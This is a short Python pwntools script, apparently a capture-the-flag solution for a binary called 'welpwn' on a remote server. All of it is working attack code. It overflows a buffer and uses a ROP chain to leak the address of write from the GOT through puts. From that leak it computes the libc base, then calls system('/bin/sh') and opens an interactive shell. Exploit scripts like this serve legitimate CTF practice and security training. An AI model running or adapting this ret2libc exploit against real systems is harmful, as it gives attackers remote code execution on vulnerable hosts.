from pwn import *
# p=process("./welpwn")
p=remote("111.198.29.45","34721")
e=ELF("./welpwn")
libc=ELF("/libc64.so")
context.log_level='debug'
context.terminal=['tmux', 'splitw', '-h']
p.recv()
# pop rdi 0x00000000004008a3
junk='1'*0x18+p64(0x40089b)+'2'*8
payload=junk #  '\x00'*8
payload+=p64(0x4008a3)+p64(e.got['write'])
payload+=p64(e.plt['puts'])+p64(0x4007CD)
# gdb.attach(p,"b*0x4007cb")
p.send(payload)
p.recvuntil("\x40")
libc_base=u64(p.recv(6)+"\x00\x00")-libc.symbols['write']
success(hex(libc_base))
payload=junk
payload+=p64(0x4008a3)+p64(libc_base+next(libc.search("/bin/sh")))
payload+=p64(libc_base+libc.symbols['system'])
p.send(payload)
p.interactive()